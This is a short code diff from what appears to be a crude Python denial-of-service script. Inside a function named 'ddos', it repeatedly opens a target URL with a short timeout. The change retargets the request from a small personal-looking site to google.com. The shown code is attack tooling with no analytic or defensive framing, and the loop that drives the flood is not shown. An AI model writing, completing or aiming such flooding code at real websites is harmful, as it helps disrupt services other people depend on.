@@ -42,7 +42,7 @@ os.system("cls")
 def ddos():
     def yourmom():
         try:
-            request.urlopen('http://officialmrnoobking.6te.net/',timeout=3)
+            request.urlopen('https://google.com/',timeout=3)
         except KeyboardInterrupt:
             print(Fore.RED+Style.BRIGHT + "\033[1;1mStop by user..." + Fore.RESET)
             exit()
